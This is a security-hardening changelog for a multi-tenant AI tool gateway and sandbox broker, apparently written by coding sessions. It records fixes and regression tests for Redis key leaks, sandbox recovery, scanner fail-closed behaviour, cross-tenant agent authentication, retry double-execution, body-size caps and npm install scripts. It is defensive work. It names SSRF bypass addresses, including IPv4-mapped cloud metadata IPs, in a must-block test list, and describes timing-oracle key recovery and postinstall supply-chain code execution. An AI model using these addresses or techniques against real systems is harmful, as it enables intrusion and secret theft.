- **WHAT (gap):** CHG-0062 fixed the orphaned-no-TTL-key leak (atomic INCR+EXPIRE NX in one MULTI/EXEC) in rate_limit_enforcement.py and the `_enforce_org_burst_rpm` shim (used by embeddings/RAG endpoints) — but the CHAT HOT PATH `proxy_chat` kept an INLINE copy still using the old non-atomic `INCR; if current == 1: EXPIRE`. On coroutine cancellation (client disconnect — routine under load) or crash BETWEEN the INCR and the EXPIRE, the key is orphaned with NO TTL forever. burst_key=`ratelimit:{org}:burst:{second}` is a NEW key every second → orphans accumulate ~1/second → unbounded Redis growth. (Ironic: `_enforce_org_burst_rpm`'s docstring calls the chat path the reference, but it was the one still carrying the bug.)
- **WHY:** the highest-traffic endpoint must not leak Redis keys under the mandate's soak/stress; parity with the already-fixed shim.
- **NOW DOES:** both proxy_chat counters use `async with REDIS_CLIENT.pipeline(transaction=True) as pipe: pipe.incr(k); pipe.expire(k, TTL, nx=True); current=(await pipe.execute())[0]` — atomic, self-healing EXPIRE NX, single await (no cancellation window). Same keys/limits/telemetry/fail-open. REDIS_CLIENT is redis.asyncio (supports pipeline + expire nx).
- **Touched whose work:** owning-session gateway chat hot path; parity with CHG-0062.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_proxy_chat_ratelimit_atomic_ttl.py ai_mesh_gateway/tests/test_rate_limit_atomic_ttl.py -q` → 7 passed; full gateway suite → 1824 passed, 0 failed. New guard asserts the non-atomic idiom is gone + EXPIRE NX present for both counters; runtime correctness of the identical pattern proven by test_rate_limit_atomic_ttl.py. NOTE: behavior-preserving; the root-cause dedup (proxy_chat calling the shim) is deferred (would change inline telemetry). Evidence: `mcp-parallel/findings/backstop-p-proxy-chat-ratelimit-orphan-ttl/finding.md`.

### CHG-0133 — a dead sandbox that fails to start was never recreated (auto-recovery gap)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — auto-recovery / chaos self-heal (stress items 13/18).
- **Severity:** MEDIUM (availability — a per-org sandbox left dead/OOM-killed/corrupted after a chaos kill failed EVERY request for that org with no self-heal until manual intervention).
- **Files:** `services/mcp-broker/src/sandbox/docker_manager.py` (`_start_or_recreate`); `services/mcp-broker/tests/test_sandbox_lifecycle.py` (+2).
- **WHAT (gap):** `ensure()`/`start()` recover a non-running sandbox via `_start_or_recreate`, but despite the name it recreated ONLY for a name-conflict (409) or "marked for removal" error (removal-race) and RE-RAISED every other start failure. A container left dead/OOM-killed/corrupted after a chaos kill fails `start()` with a GENERIC OCI/APIError (not a removal race) → re-raised, not recreated → `ensure` propagates, the next request hits the same broken container, start() fails again → the org's sandbox is stuck broken with NO self-heal (exactly the chaos-recovery scenario). The start-recovery path had NO tests.
- **WHY:** "or_recreate" must actually recreate a container that won't start; auto-recovery must cover the dead-container case, not just removal races.
- **NOW DOES:** `_start_or_recreate` removes + recreates on ANY `start()` failure. Safe: the per-org auth volume (/data/mcp-auth) persists (no data loss); a genuine daemon-down still surfaces from create_container (with its retry loop) — recreating can't make daemon-down worse; a transient start failure now self-heals.
- **Touched whose work:** owning-session broker sandbox lifecycle.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_lifecycle.py -q` → 44 passed; full broker `tests -k "not websocket"` → 162 passed. New tests: a dead container whose start() raises a generic RuntimeError is removed(force=True)+recreated(containers.run) and ensure returns the fresh running container; a stopped container whose start() succeeds is returned as-is (no remove/recreate). Evidence: `mcp-parallel/findings/backstop-p-sandbox-start-recreate-narrow/finding.md`.

### CHG-0134 — regression-lock: Tier-2 (Bedrock) scan error fails CLOSED under strict mode
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — scan of tool RESULTS fail-closed; "no leakage during degradation" (item 18). Rigorous-verification + lock of a critical untested invariant.
- **Severity:** LOW (test-only regression-lock — NO production code change).
- **Files:** `gateway/ai_mesh_gateway/tests/test_mcp_scan_orchestrator.py` (+1 test). No orchestrator change.
- **WHAT (gap):** VERIFIED sound: on a Tier-2 (Bedrock) EXCEPTION (`scan_prompt_with_tier2` raises during an outage/throttle), `_scan_text_tier2` returns block under `strict_mode=="strict"` (which DEFAULTS to strict via `tier2_ctrl.get("strict_mode") or "strict"`) and forwards under fail_open (safe — Tier-1 field redaction already ran). The `scanner is None` early-return fails-open even under strict, but that is INTENTIONAL (a non-Bedrock deployment mustn't be bricked into blocking everything; the `"strict" in fallback` gate distinguishes runtime tier2_error_strict from scanner_unavailable). BUT the test suite had NO test forcing a Tier-2 EXCEPTION — so a refactor dropping the `if strict_mode=="strict"` branch would silently start forwarding results unscanned-by-Tier-2 during a Bedrock outage (a 1.4 degradation leak) with a green suite.
- **WHY:** lock the critical fail-closed-on-Tier-2-error invariant so parallel churn on the scanner/orchestrator can't silently regress it.
- **NOW DOES:** `test_tier2_bedrock_exception_fails_closed_under_strict` drives real `scan_mcp_payload` (Tier-1 allows a benign text so Tier-2 runs; the scanner raises) and asserts strict → blocked True, fail_open → blocked False.
- **Touched whose work:** locks an invariant of the owning-session `_scan_text_tier2`/`scan_mcp_payload`; guards parallel edits to `mcp_scan_orchestrator.py`. Complements tier-1 fail-closed tests (CHG-0047/0057).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_scan_orchestrator.py -q` → 38 passed. Test-only; no behavior change. Evidence: `mcp-parallel/findings/backstop-p-tier2-error-failclosed-lock/finding.md`.

### CHG-0135 — sandbox agent /rpc leaked unexpected exceptions as raw HTTP 500 (broke JSON-RPC error contract)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — agent robustness / no-leakage-during-recovery (item 18 chaos).
- **Severity:** MEDIUM (reliability + defense-in-depth — an unexpected exception escaped as a raw HTTP 500, losing the jsonrpc_id correlation + error classification and potentially surfacing internal detail; more likely under chaos).
- **Files:** `services/mcp-broker/sandbox-image/agent/main.py` (`/rpc` handler); `services/mcp-broker/sandbox-image/agent/tests/test_rpc_unified.py` (+1).
- **WHAT (gap):** the agent's single `/rpc` entrypoint wrapped all transport dispatch in one try but only caught `UpstreamError` and `RuntimeError`. Any OTHER exception (asyncio.TimeoutError, OSError/ConnectionError, ValueError, KeyError, a bug) ESCAPED → FastAPI raw HTTP 500: (1) the broker/gateway got a non-200 instead of the JSON-RPC error envelope → the jsonrpc_id correlation is lost + error classification degrades to a generic 502; (2) a raw 500 can carry framework/exception detail (stack trace if debug ever on); (3) under chaos (kill sandbox/broker/Redis/PG — item 18) unexpected exceptions (resets/timeouts/partial failures) are exactly the more-likely case, so recovery produced raw 500s.
- **WHY:** the agent's error contract must always return a structured JSON-RPC error with the id (never a raw 500), and must not leak an unknown exception's detail.
- **NOW DOES:** a final `except Exception` safety net returns a structured JSON-RPC error with the request id, GENERIC message only (`internal sandbox agent error`, code -32000); the full detail is LOG.exception'd server-side with SAFE metadata (org/server/method, never params/args). `asyncio.CancelledError` (a BaseException) is NOT caught, so cancellation still propagates.
- **Touched whose work:** owning-session in-sandbox agent /rpc entrypoint.
- **VERIFY:** `cd services/mcp-broker/sandbox-image/agent && ../../.venv/bin/python -m pytest tests/test_rpc_unified.py -q` (passes); full agent suite green. New `test_unexpected_exception_returns_jsonrpc_error_not_500`: patches the transport handler to raise ValueError("SECRET_INTERNAL_DETAIL …") → /rpc returns 200 {"id":777,"error":{"code":-32000,"message":"internal sandbox agent error"}} — id preserved, generic message, secret detail absent. Evidence: `mcp-parallel/findings/backstop-p-agent-rpc-catchall/finding.md`.

### CHG-0136 — sandbox agent /rpc was unauthenticated (network isolation was the SOLE cross-tenant control)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4/architecture — per-tenant isolation, no single point of failure; broker→agent hop of authz.
- **Severity:** MEDIUM (cross-tenant defense-in-depth).
- **Files:** `services/mcp-broker/sandbox-image/agent/main.py`; `services/mcp-broker/src/sandbox/routes.py` (`_post_agent_rpc`); `services/mcp-broker/src/sandbox/docker_manager.py` (`_run_kwargs`); `shared/ai_mesh_shared/mcp_stdio_common.py` (`_SECRET_ENV_DENYLIST`); +tests in agent/tests/test_rpc_unified.py, tests/test_sandbox_lifecycle.py, tests/test_agent_ready_retry.py.
- **WHAT (gap):** the agent's /rpc handler verified NOTHING — no key, no caller identity — so Docker network isolation was the ONLY control preventing one sandbox from calling another org's agent. That single control can fail: (a) a host-run broker places sandboxes on the SHARED bridge (docker_manager._run_kwargs, `self.config.network`) where every sandbox can reach every other's agent port; (b) a per-org-network misconfig / Docker bug. In any of those an unauthenticated /rpc is cross-tenant-callable (invoke another org's MCP servers / read its data).
- **WHY:** cross-tenant isolation must not rest on a single layer; the broker→agent hop needs authentication.
- **NOW DOES:** opt-in `MCP_AGENT_INTERNAL_KEY` end-to-end: (1) agent /rpc requires a matching `X-Sandbox-Agent-Key` (constant-time hmac) when the env is set, else allows (backward-compat); (2) broker `_post_agent_rpc` attaches the header when configured (`headers=_headers or None` preserves the no-header contract); (3) docker_manager `_run_kwargs` provisions the SAME key into the sandbox env; (4) `MCP_AGENT_INTERNAL_KEY` added to `_SECRET_ENV_DENYLIST` and absent from `_SAFE_ENV_PASSTHROUGH`, so `_build_child_env` NEVER passes it to a spawned MCP server — which is what makes a single broker-wide key a real cross-tenant control (a malicious server in A can't read the key, so can't forge a call to B's agent). Opt-in + backward-compatible (mixed old/new sandboxes safe).
- **Touched whose work:** owning-session agent /rpc + broker _post_agent_rpc + docker_manager env + shared child-env builder.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests -q -k "not websocket"` → 166 passed; full agent suite green. New tests: agent /rpc missing/wrong key → -32001, correct → dispatch, unset → allow; _run_kwargs provisions/omits the key; _post_agent_rpc sends the header when set / none when unset (CHG-0121 X-Request-ID tests still pass). Byte-probe: `_build_child_env` refuses to pass the key to a child (denylist). Evidence: `mcp-parallel/findings/backstop-p-agent-rpc-auth/finding.md`.

### CHG-0137 — gateway retried tools/call after dispatch → double-execution of side-effecting tools
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — gateway↔broker forwarding correctness; retries under chaos/partial-failure.
- **Severity:** MEDIUM (correctness/safety — a non-idempotent tools/call that succeeded upstream but whose response was slow/lost was retried → duplicate side effect: send-email-twice, double-charge, delete+recreate).
- **Files:** `gateway/ai_mesh_gateway/mcp_sandbox_client.py` (`_request_with_503_retry`, `broker_send_rpc`); `gateway/ai_mesh_gateway/tests/test_mcp_sandbox_client.py` (+4).
- **WHAT (gap):** `broker_send_rpc` forwards every JSON-RPC exchange via `_request_with_503_retry`, which retried on 503 (safe — pre-execution) AND on ANY `httpx.HTTPError`. httpx.HTTPError includes `ReadTimeout`: for a tools/call (gateway→broker→agent→upstream, which EXECUTES the tool then replies), a slow reply that ReadTimeouts on the gateway means the request was already dispatched and the tool ALREADY ran — but the retry re-POSTs → the upstream executes the tool a SECOND time. tools/call is non-idempotent (side effects), so a routine slow call or a chaos partial-failure double-executes it.
- **WHY:** a non-idempotent call must not be retried once it may have executed upstream.
- **NOW DOES:** idempotency-aware retry. `_NON_IDEMPOTENT_METHODS={"tools/call"}`; `_request_with_503_retry` gains `idempotent` (default True, preserves ensure_sandbox etc.). On httpx.HTTPError, a NON-idempotent call retries ONLY if the error is PRE-SEND (`ConnectError`/`ConnectTimeout`/`PoolTimeout` — connection never established, tool couldn't have run); a POST-send error (ReadTimeout/reset) on a non-idempotent call fails immediately (RuntimeError, not retried). 503 retry unchanged (always pre-execution). `broker_send_rpc` passes `idempotent=(method not in _NON_IDEMPOTENT_METHODS)`.
- **Touched whose work:** owning-session gateway sandbox client (the single gateway→broker→sandbox path).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_sandbox_client.py -q` → 17 passed; full gateway suite → 1874 passed, 0 failed. New tests: tools/call+ReadTimeout → NOT retried (call_count 1, "double execution"); tools/list+ReadTimeout → retried (idempotent); tools/call+ConnectError (pre-send) → retried; tools/call+503 → retried. Evidence: `mcp-parallel/findings/backstop-p-toolscall-retry-double-exec/finding.md`.

### CHG-0138 — regression-lock: agent SSRF IP classifier blocks IPv6 + IPv4-mapped-IPv6 + all internal ranges
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — egress SSRF guard coverage; rigorous-verification + lock (complements CHG-0067).
- **Severity:** LOW (test-only regression-lock — NO production code change).
...
- **WHAT (gap):** VERIFIED sound: the agent SSRF guard `_resolved_ip_blocked` (CHG-0067) blocks `_METADATA_IPS` (169.254.169.254, fd00:ec2::254) + `ipaddress` is_private/loopback/link_local/reserved/multicast/unspecified, fail-closes on unparseable, and `_assert_upstream_not_ssrf` checks ALL resolved IPs (DNS-rebinding). Byte-probed the classic IPv4-mapped-IPv6 bypass (`::ffff:169.254.169.254`, `::ffff:10.0.0.1`) + full IPv6 battery → ALL blocked (Python 3.14 ipaddress flags mapped form is_private=True); public allowed. BUT the existing SSRF tests only cover the FLOW (internal host → denied) — NO test of the classifier's IPv6 / mapped-IPv6 / ULA / metadata / reserved coverage. A refactor (or a Python version mis-handling mapped IPv6) that dropped IPv6/mapped coverage would silently re-open SSRF egress with a green suite.
- **WHY:** lock the verified SSRF classifier coverage against a silent regression.
- **NOW DOES:** `test_ssrf_ip_classifier.py` parametrizes a must-block battery (IPv4 metadata/private/loopback/link-local; IPv6 metadata/loopback/link-local/ULA; IPv4-mapped-IPv6 metadata & private; unspecified; unparseable→fail-closed) + a must-allow public set, asserting `_resolved_ip_blocked`; +2 async tests locking `_assert_upstream_not_ssrf` end-to-end on a literal mapped-IPv6 metadata host (denied) and a public literal (allowed).
- **Touched whose work:** locks the owning-session agent SSRF guard invariant.
- **VERIFY:** `cd services/mcp-broker/sandbox-image/agent && ../../.venv/bin/python -m pytest tests/test_ssrf_ip_classifier.py -q` → 23 passed; agent collection clean (107 tests); broker suite 166 passed (unaffected). NOTE (residual, out of scope): DNS-rebinding TOCTOU (guard resolves then httpx re-resolves at connect) — needs connection-level IP pinning httpx doesn't easily support. Evidence: `mcp-parallel/findings/backstop-p-ssrf-classifier-lock/finding.md`.

### CHG-0139 — regression-lock: the MCP audit record never contains the raw PII/secret value (leak-at-rest)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — compliance tagging / audit; rigorous-verification + lock of an untested leak-at-rest invariant.
- **Severity:** LOW (test-only regression-lock — NO production code change).
- **Files:** `gateway/ai_mesh_gateway/tests/test_mcp_audit_no_raw_leak.py` (new, +6 parametrized). No production code change.
- **WHAT (gap):** VERIFIED sound: `_record_gateway_event` serializes into the MCPEvent audit row decision/policy_reason/compliance_tags/scan_findings(`McpFinding.to_finding_dict()`)/metadata. `McpFinding` carries only entity_type/score/start-end OFFSETS/direction/tier/threat_type/detail(=TYPE names, "Matched: email, aws_access_key")/matched_kinds(TYPE names) — NO raw-value field; compliance_tags are tag CODES (normalized to catalog at control-plane tasks.py); metadata is {transport, enforced_at, scan_trace}. Byte-probed a battery (AWS key/email/SSN/GitHub PAT/Stripe/internal IP) → the raw value is ABSENT from json.dumps({findings, compliance_tags, metadata}) for every class, and the redacted result drops it. BUT there was NO test asserting the audit-serializable output carries no raw value (the redaction tests assert the EGRESS RESULT bytes, a DIFFERENT surface than the AUDIT RECORD bytes). A future McpFinding.detail that quoted the matched span, or a caller threading raw content into metadata, would silently leak the exact secret/PII into the audit DB (leak-at-rest) with a green suite.
- **WHY:** the persisted MCPEvent audit trail must never become a leak-at-rest of the very secret it redacted.
- **NOW DOES:** `test_mcp_audit_no_raw_leak.py` runs scan_mcp_payload (redact) on each secret/PII and asserts the raw value is absent from json.dumps({findings.to_finding_dict(), compliance_tags, metadata}), while asserting the scanner DID detect it (non-vacuous) and the redacted result drops it.
- **Touched whose work:** locks the owning-session scan orchestrator (McpFinding/scan_mcp_payload) + audit path invariant.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_audit_no_raw_leak.py -q` → 6 passed; full gateway suite → 1926 passed, 0 failed. Evidence: `mcp-parallel/findings/backstop-p-audit-no-raw-leak-lock/finding.md`.

### CHG-0140 — internal chat-pipeline MCP routes had no inbound body-size cap (unbounded-buffer DoS)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — gateway validation / DoS bounds; parity across MCP entry points (CHG-0034/0063).
- **Severity:** MEDIUM (DoS — unbounded body buffering into gateway memory; the chat user's tool arguments flow through these routes = attacker-influenced).
- **Files:** `gateway/ai_mesh_gateway/mcp_proxy.py` (`internal_tools_call`, `internal_discover_tools`); `gateway/ai_mesh_gateway/tests/test_mcp_body_cap.py` (+4).
- **WHAT (gap):** every MCP entry point should cap its inbound body via `_mcp_body_too_large` (Content-Length pre-check, CHG-0034) + `_mcp_read_body_capped` (streaming byte-cap, CHG-0063) — the `_mcp_body_too_large` docstring even says the streaming cap is used by "every MCP entry point". But `internal_tools_call` (/v1/mcp/internal/tools-call) and `internal_discover_tools` (/v1/mcp/internal/discover-tools) did `body = await request.json()` directly with NO cap → the whole body buffers unbounded. The other 3 routes (org_mcp_jsonrpc, org_mcp_tool_call, ext_mcp_proxy) cap. The internal routes are called by the trusted backend, but the payload carries the CHAT USER's tool ARGUMENTS (a user can send an arbitrarily large arg via chat), so a huge body reaches the gateway and buffers unbounded → memory-exhaustion DoS.
- **WHY:** the gateway must self-defend against an oversized body on every entry point, not trust the backend to pre-cap.
- **NOW DOES:** both internal routes apply `if _mcp_body_too_large(request): 413` + `try: await _mcp_read_body_capped(request) except _MCPBodyTooLarge: 413`, immediately after the internal-key check and before request.json() (which reuses the cached capped bytes). Oversized body → HTTP 413 mcp_body_too_large. Legit under-ceiling bodies unchanged.
- **Touched whose work:** owning-session gateway internal (chat-pipeline) MCP routes.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_body_cap.py -q` → 13 passed; full gateway suite → 1930 passed, 0 failed. New tests (both routes): oversized Content-Length → 413 (pre-check); chunked no-Content-Length over ceiling → 413 (streaming cap). All 5 MCP routes now apply `_mcp_read_body_capped` (grep-verified). Evidence: `mcp-parallel/findings/backstop-p-internal-routes-body-cap/finding.md`.

### CHG-0141 — stdio transport default was fail-OPEN (spawned untrusted npm/uvx IN the gateway host process)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — "ALL transports in the per-org sandbox; NOTHING in the main backend; no unknown npm on the host." Secure-by-default on a security-critical toggle.
- **Severity:** MEDIUM (secure-default / tenant-isolation — a fail-OPEN default meant a prod deploy that forgot one env var silently ran untrusted, org-supplied stdio MCP servers directly in the shared gateway process on the host, with cross-tenant process/fs sharing and no gVisor sandbox).
- **Files:** `gateway/ai_mesh_gateway/mcp_stdio_adapter.py` (`_STDIO_IN_PROCESS_DEFAULT`); `gateway/ai_mesh_gateway/tests/test_mcp_stdio_adapter_branch.py` (+2).
- **WHAT (gap):** `_STDIO_IN_PROCESS_DEFAULT` was `"true"`. `send_jsonrpc()` dispatches on `_stdio_in_process()`: `False` → `_send_jsonrpc_broker` (route the stdio server into the per-org gVisor sandbox via the broker); `True` → `_send_jsonrpc_in_process` (spawn npx/uvx/node IN the gateway process, on the host). With the default `"true"`, ANY deployment that did not explicitly set `MCP_STDIO_IN_PROCESS=false` ran org-registered stdio servers **on the gateway host** — untrusted third-party npm/PyPI code executing in the shared multi-tenant process, defeating "ALL transports in the sandbox / no unknown npm on the host / NOTHING in the main backend". A fail-OPEN default: the *unsafe* mode was the one you got by omission.
- **WHY:** a security-critical isolation toggle must default to the *safe* side. Forgetting an env var must degrade to "sandboxed", never to "runs untrusted code on the host". Compose/prod already set `false`; the risk was any deploy path (helm/k8s/bare/dev-promoted-to-prod) that missed it.
- **NOW DOES:** `_STDIO_IN_PROCESS_DEFAULT = "false"` → with `MCP_STDIO_IN_PROCESS` unset, `send_jsonrpc()` routes stdio through the per-org sandbox (`_send_jsonrpc_broker`), same as remote transports. The in-gateway spawn is still available but now **opt-in**: set `MCP_STDIO_IN_PROCESS=true` (dev-only / single-tenant, when no broker is running). All 4 pre-existing tests that exercise the in-process path already set the env explicitly (monkeypatch), so none relied on the old default.
- **Touched whose work:** the owning-session stdio adapter (sandbox-routing migration). Flips a deliberate dev-convenience default to secure-by-default; no behavior change for anyone who already sets the env (compose/prod).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_stdio_adapter_branch.py -q` → 8 passed (incl. new `test_stdio_default_is_sandbox_secure`: unset → `_stdio_in_process() is False` + `_STDIO_IN_PROCESS_DEFAULT == "false"`; and `test_stdio_in_process_still_opt_in`: `=true` → True). Full gateway suite → 1948 passed, 0 failed (proving the flip is test-safe — every flag-referencing test sets it explicitly). Evidence: `mcp-parallel/findings/backstop-p-stdio-secure-default/finding.md`.

### CHG-0142 — sandbox image baked NO npm-level supply-chain control (install-scripts only pinned by one runtime env path)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — item 8 sub-item (2) "bake a locked .npmrc into the sandbox image"; "no unknown npm on the host" / supply-chain.
- **Severity:** LOW-MEDIUM (defense-in-depth — the runtime already pins `npm_config_ignore_scripts=true` per child (CHG-0044); this adds an image-level fallback so the supply-chain RCE vector stays closed for any npx invocation that doesn't inherit that env).
- **Files:** `services/mcp-broker/sandbox-image/Dockerfile` (new global-npmrc RUN layer); `services/mcp-broker/tests/test_sandbox_image.py` (+1 guard). No application/runtime code change.
- **WHAT (gap):** untrusted tenant-registered stdio MCP servers are fetched with `npx`/`npm` in the sandbox; a package's `preinstall`/`install`/`postinstall` is a supply-chain RCE vector. CHG-0044 force-pins `npm_config_ignore_scripts=true` in `_build_child_env` — authoritative, but it is the ONLY thing disabling scripts and it protects only the one spawn path that calls `_build_child_env`. It does NOT cover a manual/debug `npx` inside the sandbox, any future spawn path that forgets the env, or a regression that drops the pin. The `Dockerfile` baked NO npm hardening (no `.npmrc`, no global config), so outside that one code path `npx` defaulted to `ignore-scripts=false`.
- **WHY:** a supply-chain control this important should be enforced at the image/config level (npm's own config), not rest solely on one env-building function.
- **NOW DOES:** the image bakes a GLOBAL npmrc at `/usr/local/etc/npmrc` (= `$PREFIX/etc/npmrc` for the /usr/local prefix, read for ANY user) with `ignore-scripts=true` (+ `audit=false`/`fund=false`/`update-notifier=false` to suppress incidental egress from the egress-locked sandbox). Root-owned (created pre-`USER sandbox`) so the unprivileged user can't rewrite it. npm precedence (global < env) means the CHG-0044 runtime env still takes precedence and AGREES → belt-and-suspenders, no behavior change; a malicious package can't re-enable its own install scripts via a project `.npmrc` (env wins). The package bin (the MCP server) still runs; only install hooks are suppressed.
- **Touched whose work:** the shared sandbox image (architecture-hardening surface). Additive layer.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_image.py -q` → 5 passed (new `test_dockerfile_bakes_global_npmrc_ignore_scripts` asserts `ignore-scripts=true` is REDIRECTED into `/usr/local/etc/npmrc`); full broker suite `-k "not websocket"` → 167 passed, 0 failed. The real image-build gate (`@pytest.mark.docker test_sandbox_image_builds`) + a live malicious-postinstall egress-capture proof remain host-blocked (Docker unavailable here) → item 8 stays `[ ]`. Evidence: `mcp-parallel/findings/backstop-p8-npmrc-global-ignore-scripts/finding.md`.

### CHG-0143 — sandbox ran under runc (no gVisor) SILENTLY when the runtime was unset/unavailable and not required
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — item 12 (gVisor + seccomp/no-new-privileges/cap_drop/egress-lockdown). Make a documented silent degradation loud.
- **Severity:** LOW-MEDIUM (observability of a security-critical degraded posture — does NOT change isolation behavior; converts a *silent* runc fallback into a *loud* one so operators can detect "sandboxes are not actually under gVisor").
- **Files:** `services/mcp-broker/src/sandbox/docker_manager.py` (`DockerManager.__init__`, `_resolve_runtime`); `services/mcp-broker/tests/test_sandbox_lifecycle.py` (+3). No behavior change.
- **WHAT (gap):** `_resolve_runtime()` only validates/`raise`s when `MCP_SANDBOX_RUNTIME_REQUIRED` is true. In the default (not-required) path it returned the configured runtime as-is with NO signal: runtime unset → `None` → Docker default **runc** (shared host kernel, no gVisor); runtime set to `runsc` but not installed → returned `"runsc"` anyway. `docs/mcp/BACKSTOP_FINDINGS.md` documented that the compose broker sets neither env and prod compose defines no broker → "by default containers run under runc, silently degrading instead of failing closed." An operator who believes they deployed with gVisor but mis-set the env gets no signal.
- **WHY:** defaulting `runtime_required=true` is the right *prod* posture but would break every dev/CI host without gVisor and belongs to deployment config, not this code path. The safe in-scope hardening is to make the degraded posture detectable (log/alert) instead of invisible.
- **NOW DOES:** in the not-required branch, warn ONCE per manager (guarded by `self._runtime_degraded_warned`, set in `__init__`) — never raise, never spam per create: runtime unset → warn "starting WITHOUT a kernel-isolation runtime … Docker default 'runc' … set MCP_SANDBOX_RUNTIME=runsc + …_REQUIRED=true"; runtime configured but unavailable → warn "NOT available … will error or fall back … set …_REQUIRED=true to fail closed". Healthy case (configured AND available) stays quiet. The returned runtime is identical in every case → zero behavior change; the `runtime_required=true` fail-closed path is untouched.
- **Touched whose work:** broker sandbox runtime resolution (architecture-hardening surface).
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_lifecycle.py -q -k runtime` → 7 passed (4 old + 3 new: unset→`None`+warn-once; configured-unavailable→`"runsc"`+warn, no raise; available→`"runsc"`+no warn); full lifecycle → 49 passed; broker `-k "not websocket"` → 170 passed, 0 failed. The real remediation (set the envs on the broker in both compose files, define the broker in prod compose, prove `docker inspect … Runtime=runsc` live) remains host-blocked → item 12 stays `[ ]`. Evidence: `mcp-parallel/findings/backstop-p12-runtime-degraded-warning/finding.md`.

### CHG-0144 — admin-RBAC bypass compared the shared internal key with a non-constant-time `==` (timing side-channel)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — gateway auth/authz (item 9). Crypto-hygiene consistency with the codebase's own constant-time-compare convention.
- **Severity:** LOW-MEDIUM (timing side-channel on the server-to-server bypass of admin-RBAC for `/v1/admin/*`; a plain `==` leaks the secret's length/prefix via response timing → byte-by-byte key recovery by a caller of the admin endpoints).
- **Files:** `gateway/ai_mesh_gateway/main.py` (`_require_admin_role`, +`import hmac`); `gateway/ai_mesh_gateway/tests/test_admin_internal_key_constant_time.py` (new, +4).
- **WHAT (gap):** `_require_admin_role` bypasses admin-RBAC when the caller presents `GATEWAY_INTERNAL_API_KEY` in `X-Gateway-Internal-Key`, but compared it with `header_key == internal_key`. `str.__eq__` short-circuits on the first differing byte → comparison time correlates with the matching-prefix length (secret-comparison timing oracle). Every other secret comparison in the gateway already uses constant-time compare — `mcp_proxy._valid_internal_key` (`hmac.compare_digest`), `middleware.py:301`, `metrics_auth.py:35` (`secrets.compare_digest`), `policy_signing.py:69` — so this admin-gate shim was the lone plain-`==` omission.
- **WHY:** a shared-secret comparison guarding an admin bypass must be constant-time; anything else is a timing oracle.
- **NOW DOES:** `if header_key and hmac.compare_digest(header_key, internal_key): return None`. Same time regardless of mismatch position. Behaviour identical: the correct key still bypasses (`None`); any wrong key falls through to `require_admin(auth_ctx)` and is rejected. `import hmac` added.
- **Touched whose work:** the gateway admin-gate shim.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_admin_internal_key_constant_time.py -q` → 4 passed (correct key→`None`; same-length one-byte-off→401/403; missing header→401/403; source guard: `hmac.compare_digest(header_key, internal_key)` present AND no `header_key == internal_key`). NOTE: the full gateway suite currently has 6–7 PRE-EXISTING failures in an unrelated subsystem (`test_mcp_obfuscated_cred_in_pii.py` zero-width-unicode, `test_mcp_unicode_deobfuscation.py`, `test_mcp_tools_list_audit.py::test_block_is_audited`) that another session is editing — proven NOT mine by reverting `main.py` to HEAD and reproducing the same failures on a clean tree (those tests never touch `_require_admin_role`/the internal key). Evidence: `mcp-parallel/findings/backstop-p9-admin-key-constant-time/finding.md`.

### CHG-0145 — regression-lock: backend-bound actor-authz headers are non-spoofable from inbound headers
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — per-user/agent/role tool authorization (item 3); the actor-keyed authz the mandate repeatedly emphasizes.
- **Severity:** LOW (test-only regression-lock — NO production code change). Locks a verified-sound invariant: the actor identity forwarded to the backend policy engine (`X-Gateway-Roles`/`-User-Id`/`-Key-Prefix`/`-Project-Id`) is derived only from the server-side auth context and cannot be spoofed by a client-supplied inbound header (a spoofable `X-Gateway-Roles` = role escalation bypassing per-actor tool authz).
- **Files:** `gateway/ai_mesh_gateway/tests/test_mcp_bare_proxy_scan.py` (+2 tests + 1 helper). No production code change.
- **WHAT (gap):** verified sound — `_control_request_headers` returns a fresh dict copying NO inbound header; `_backend_proxy_headers` sets the actor headers from `_get_auth_context(request)` (= `request.state.auth_context`, server-derived from the key's Redis payload; `AuthContext.roles` comes from `owner.profile.roles`). The gateway never reads `X-Gateway-Roles`/`-User-Id` from an inbound request (grep: zero hits) and no live path forwards inbound headers wholesale (the only wholesale-forwarder `_proxy` is dead code). But there was NO test asserting non-spoofability → a future change (merging `request.headers`, reviving `_proxy`, a new route trusting inbound `X-Gateway-Roles`) would silently open a role-escalation path with a green suite.
- **WHY:** the backend policy engine trusts these headers for `Policy.allowed_roles`/user/project; their non-spoofability is a load-bearing 1.4 authz invariant worth locking.
